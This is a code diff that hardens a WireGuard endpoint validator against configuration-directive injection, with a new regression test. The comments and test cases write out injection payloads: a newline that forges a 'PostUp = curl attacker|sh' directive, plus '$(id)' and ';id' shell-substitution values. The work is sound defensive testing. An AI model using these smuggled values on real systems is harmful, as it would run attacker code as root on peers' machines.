@@ -424,6 +424,21 @@ fn validate_cidr(value: &str) -> std::result::Result<(), String> {
 }
 
 /// Rejects anything that could not be dialled as `address:port`.
+///
+/// Both halves, which is the whole of it. This checked the port and took the
+/// host on trust beyond being non-empty, and the value is written verbatim into
+/// the peer configuration as `Endpoint = {value}` — an INI file the peer hands
+/// to `wg-quick`, which runs a `PostUp` directive **as root**. So
+/// `vpn.example.org\nPostUp = curl attacker|sh:51820` passed, forged a second
+/// directive, and executed on the peer's machine. Measured against this
+/// function before the host half was checked.
+///
+/// The neighbouring [`validate_ip`] and [`validate_cidr`] parse rigorously and
+/// say in their own docs that the value reaches `wg0.conf`; this one landed in
+/// the same file with none of that care. The characters below are what an
+/// address or a DNS name can hold — letters, digits, dots, hyphens, and colons
+/// for IPv6 — so a newline, a space, a `$` or a `;` is refused by describing
+/// what is allowed rather than by listing what is not.
 fn validate_endpoint(value: &str) -> std::result::Result<(), String> {
     let Some((host, port)) = value.rsplit_once(':') else {
         return Err("an endpoint carries its port, as 203.0.113.7:51820".to_owned());
@@ -431,6 +446,20 @@ fn validate_endpoint(value: &str) -> std::result::Result<(), String> {
 
     if host.is_empty() {
         return Err("the address is missing".to_owned());
+    }
+
+    // An allow-list, because the deny-list version of this is the one that
+    // misses a character. `[` and `]` are admitted for a bracketed IPv6
+    // literal, which is how an address carrying colons is written beside a
+    // port.
+    if let Some(bad) = host
+        .chars()
+        .find(|c| !c.is_ascii_alphanumeric() && !".-:[]".contains(*c))
+    {
+        return Err(format!(
+            "an address cannot contain {bad:?} — it is written into the peer's \
+             configuration, where a line of its own would be a directive"
+        ));
     }
 
     validate_port(port)
@@ -1467,6 +1496,34 @@ mod tests {
                 (":51820", false),
                 ("203.0.113.7", false),
                 ("", false),
+            ],
+        );
+    }
+
+    #[test]
+    fn an_endpoint_host_cannot_forge_a_directive() {
+        // Every case in the table above varies the *port*, which is why this
+        // went unnoticed: the host half was checked for being non-empty and
+        // nothing else, while the value is written verbatim into the peer's
+        // configuration as `Endpoint = {value}`. A newline there ends the
+        // setting, and `wg-quick` runs a `PostUp` directive as root on the
+        // peer's machine. Reproduced against the validator before the fix.
+        check_table(
+            ParamKind::Endpoint,
+            &[
+                (
+                    "vpn.example.org\nPostUp = curl attacker.invalid|sh:51820",
+                    false,
+                ),
+                ("$(id):51820", false),
+                ("a;id:51820", false),
+                ("vpn example.org:51820", false),
+                ("vpn.example.org\r:51820", false),
+                // Still accepts what an endpoint legitimately looks like,
+                // including a bracketed IPv6 literal beside its port.
+                ("203.0.113.7:51820", true),
+                ("vpn-1.example.org:51820", true),
+                ("[2001:db8::1]:51820", true),
             ],
         );
     }
